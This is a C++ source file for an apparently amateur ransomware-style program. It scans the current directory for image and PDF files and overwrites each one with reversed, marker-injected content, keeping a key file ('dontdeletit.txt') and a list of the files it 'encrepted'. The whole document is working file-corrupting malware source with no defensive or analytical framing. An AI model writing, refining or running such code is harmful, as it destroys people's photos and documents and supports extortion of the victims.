#include<iostream>
#include<dirent.h>
#include<fstream>
#include<string>
#include<vector>
#include<algorithm>
#include<ctime>
#include<windows.h>
#include<stdio.h>
using namespace std;

int main(){

    //checking dontdeletit.txt exist or not
    int checkpoint = 1;
    DIR* dir;
    struct dirent* ent;
    dir = opendir(".");
    while((ent = readdir(dir)) != NULL){
        if(string(ent->d_name) == string("dontdeletit.txt")){
            checkpoint = 0;
        }
    }
    //closing the directory
    closedir(dir);

    try{
        if(checkpoint == 1){
            //here we make the file to store the filenames
            string file = "filename.txt";
            string file2 = "dontdeletit.txt";
            string fileline;
            ofstream write;
            write.open(file2);
            write.close();
            write.open(file); 

            //make a vector to store the file names;
            vector<string> filenames;
            vector<string> specialfilename;
            vector<string> phototype{".PNG",".JPG","JPEG",".PDF",".GIF",".png",".jpg","jpeg",".pdf",".gif"};
            vector<string> specialsign{"CDEFGHIJSTUVWXY","Rm4","33Wohj","M19","98643bjh"};

            //here to get all the file name in dir and store it in a vector
            DIR* dr;
            struct dirent* entry; 
            dr = opendir(".");
            int i = 1;
            while((entry = readdir(dr)) != NULL){
                if(i > 2){
                    filenames.push_back(string(entry->d_name));
                }
                i++;
            }
            closedir(dr);

            //code to store the some special file in txt file and in vector
            vector<string> :: iterator iter;
            for(iter = filenames.begin(); iter != filenames.end();iter++){
                auto iter2 = phototype.begin();
                string name = *iter;
                int size = name.size();
                while(iter2 != phototype.end()){
                    if(name.substr(size-4) == *iter2){
                        write<<name<<endl;
                        specialfilename.push_back(string(name));
                    };
                    iter2++;
                }
            }
            //code to how many file is encrepted
            write<<"Total no of files: "<<specialfilename.size()<<endl;
            write.close();
            
            //now converting specialfiles in a binery formate and add some other digits to it
            
            string data;
            for(int i = 0;specialfilename.size() > i;i++){
                srand(time(0));
                int randomchoice = rand()%5;

                //converting image to binary formate and store it to try.txt
                ifstream read2(specialfilename[i],ios::in|ios::binary);
                ofstream write2("try.txt",ios::out|ios::binary),write3;
                string insertdata = specialsign[randomchoice];
                auto first = insertdata.begin();
                auto last = insertdata.end();
                while(!read2.eof()){
                    getline(read2,data);
                    reverse(data.begin(),data.end());
                    if(data.size()>0){
                        if(randomchoice>0){
                            data.insert(data.begin() + int(data.size()/randomchoice),first,last);
                        }
                        else if(randomchoice == 0){
                            data.insert(data.begin() + int(data.size()/5),first,last);
                        }
                    }
                    write2<<data<<endl;
                }

                //writing the randomchoice to dontdeletit
                write3.open("dontdeletit.txt",ios::out|ios::app);
                write3<<randomchoice<<" ";

                //closing the files
                read2.close();
                write2.close();
                write3.close();

                //writing the try.txt binery data to the image files
                read2.open("try.txt",ios::in|ios::binary);
                write2.open(specialfilename[i],ios::out|ios::binary);
                while(!read2.eof()){
                    getline(read2,data);
                    write2<<data<<endl;
                }
                //closing the file
                read2.close();
                write2.close();

            }

            //code to delet the some generated files
            remove("try.txt"); //it is in stdio.h
        }

        else{
            cout<<"Work is already dont!!"<<endl;
        }
    }

    catch(int i){}
    
    return 0;
}